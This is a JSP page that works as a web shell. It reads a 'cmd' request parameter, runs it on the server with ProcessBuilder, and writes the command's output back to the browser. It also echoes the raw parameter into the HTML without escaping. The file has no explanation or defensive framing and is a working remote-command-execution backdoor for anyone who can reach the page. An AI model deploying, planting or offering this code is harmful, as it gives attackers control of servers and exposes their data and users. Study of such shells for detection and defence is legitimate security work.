<html>
    <head>
    </head>

    <body>
        <%@ page import="java.io.*" %>
        <%@ page import="java.util.*" %>
    
        <%
            String command = request.getParameter("cmd");
        %>
        
        <h1>
            <% out.println("Command: " + command); %>
        </h1>

        <%
            if (command != null) {
                try {
                    ProcessBuilder processBuilder = new ProcessBuilder(command);
                    processBuilder.redirectErrorStream(true);    
                    
                    Process process = processBuilder.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        out.println(line + "<br>");
                    }

                    int exitCode = process.waitFor();
                    out.println("Command exited with code: " + exitCode);

                } catch (Exception e) {
                    out.println("Error executing command: " + e.getMessage());
                }
            } else {
                out.println("Invalid command.");
            }
        %>
    </body>
</html>
